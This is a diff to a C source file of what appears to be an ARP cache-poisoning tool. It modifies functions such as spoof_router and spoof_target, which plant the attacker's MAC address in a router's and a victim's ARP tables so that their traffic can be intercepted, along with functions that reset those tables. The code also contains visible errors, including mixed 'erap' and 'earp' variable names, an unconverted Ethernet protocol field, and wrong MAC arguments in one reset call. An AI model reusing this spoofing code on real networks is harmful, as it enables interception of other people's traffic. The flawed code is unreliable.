@@ -3,22 +3,29 @@
 # include <arp.h>
 
 # include <inttypes.h>
-# include <linux/if_ether.h>
 # include <netinet/if_ether.h>
 
 
 # include <string.h> ///TODO: Must use mine
 
-///TODO: Set bits in MAC's for multicast
-
-static err_t   send_arp(int fd, const struct sockaddr* dest, const struct ether_arp* earp)
+static err_t   send_arp(int fd, const struct sockaddr* sdest, const struct ether_arp* earp,
+const uint8_t* src_mac, const uint8_t* dest_mac)
 {
-    uint8_t buff[sizeof(*earp)] = {0};
+    uint8_t buff[sizeof(struct ethhdr) + sizeof(*earp)] = {0};
 
-    struct ether_arp* earp_buffptr = (struct ether_arp*)buff;
+    struct ethhdr* const eth = (struct ethhdr*)buff;
+
+    *eth = (struct ethhdr){
+        .h_proto = ETH_P_ARP
+    };
+
+    memcpy(eth->h_source, src_mac, SIZEOFMAC);
+    memcpy(eth->h_dest, dest_mac, SIZEOFMAC);
+
+    struct ether_arp* earp_buffptr = (struct ether_arp*)(buff + sizeof(*eth));
     *earp_buffptr = *earp;
 
-    const ssize_t sentbytes = sendto(fd, buff, sizeof(*earp), 0, dest, sizeof(*dest));
+    const ssize_t sentbytes = sendto(fd, buff, sizeof(buff) / sizeof(*buff), 0, sdest, sizeof(*sdest));
 
     if (sentbytes < 0)
     {
@@ -42,11 +49,10 @@ err_t   send_arp_request_to_target(const proginfo_t* const info)
 
     memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
     memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
-    memcpy(earp.arp_tha, ETHER_BROADCAST_MAC, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->mymachine.mac, ETHER_BROADCAST_MAC);
 }
 
 /// Send standart ARP Request to the router, the router should reply.
@@ -62,11 +68,10 @@ err_t   send_arp_request_to_router(const proginfo_t* const info)
 
     memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
     memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
-    memcpy(earp.arp_tha, ETHER_BROADCAST_MAC, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->mymachine.mac, ETHER_BROADCAST_MAC);
 }
 
 /// Send standart ARP Reply to target
@@ -85,8 +90,8 @@ err_t   send_arp_reply_to_target(const proginfo_t* const info)
     memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->mymachine.mac, info->target.mac);
 }
 
 /// Spoof my MAC address into router's ARP table at target's ip index.
@@ -105,8 +110,8 @@ err_t   spoof_router(const proginfo_t* const info)
     memcpy(earp.arp_tha, info->router.mac, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->mymachine.mac, info->target.mac);
 }
 
 /// Spoof my MAC address into target's ARP table at router's ip index.
@@ -125,8 +130,8 @@ err_t   spoof_target(const proginfo_t* const info)
     memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->mymachine.mac, info->router.mac);
 }
 
 /// Remove my spoofed MAC address from target's ARP table (at router's ip index)
@@ -140,13 +145,13 @@ err_t	reset_arp_target(const proginfo_t* const info)
         .arp_op = htons(ARP_REPLY),
     };
 
-	memcpy(erap.arp_sha, info->router.mac, SIZEOFMAC);
+    memcpy(erap.arp_sha, info->router.mac, SIZEOFMAC);
     memcpy(erap.arp_spa, info->router.ip, SIZEOFIP);
     memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->router.mac, info->target.mac);
 }
 
 /// Remove my spoofed MAC address from router's ARP table (at target's ip index)
@@ -160,11 +165,11 @@ err_t	reset_arp_router(const proginfo_t* const info)
         .arp_op = htons(ARP_REPLY),
     };
 
-	memcpy(erap.arp_sha, info->target.mac, SIZEOFMAC);
+    memcpy(erap.arp_sha, info->target.mac, SIZEOFMAC);
     memcpy(erap.arp_spa, info->target.ip, SIZEOFIP);
     memcpy(earp.arp_tha, info->router.mac, SIZEOFMAC);
     memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);
 
-    return send_arp(info->socksend, (const struct sockaddr*)&info->target.addr,
-	(const struct ether_arp*)&earp);
+    return send_arp(info->sockarp, (const struct sockaddr*)&info->target.addr,
+	(const struct ether_arp*)&earp, info->target.mac, info->target.mac);
 }
